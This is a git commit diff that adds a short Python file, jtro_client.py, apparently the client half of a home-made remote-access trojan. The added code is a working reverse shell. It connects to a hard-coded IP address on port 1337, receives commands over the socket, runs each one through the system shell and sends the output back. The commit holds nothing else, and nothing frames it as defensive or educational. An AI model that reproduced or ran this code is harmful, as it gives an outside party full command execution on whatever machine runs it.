94bcfe967f6b2998b0fee9a9c5823d28183b157c
jakiiii <me.jaki@outlook.com>
2019-02-13 12:57:03 +0600

    fixed client and server

--- jtro_client.py
+++ jtro_client.py
@@ -1,1 +1,20 @@
 #!/usr/bin/env python3
+import socket
+import subprocess
+
+
+def execute_system_command(command):
+    return subprocess.check_output(command, shell=True)
+
+
+c = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+c.connect(("192.168.31.207", 1337))
+
+c.send("\n[+] Connection has been established.\n".encode('utf-8'))
+
+while True:
+    cmd = c.recv(1024).decode('utf-8')
+    cmd_result = execute_system_command(cmd)
+    c.send(cmd_result)
+
+c.close()
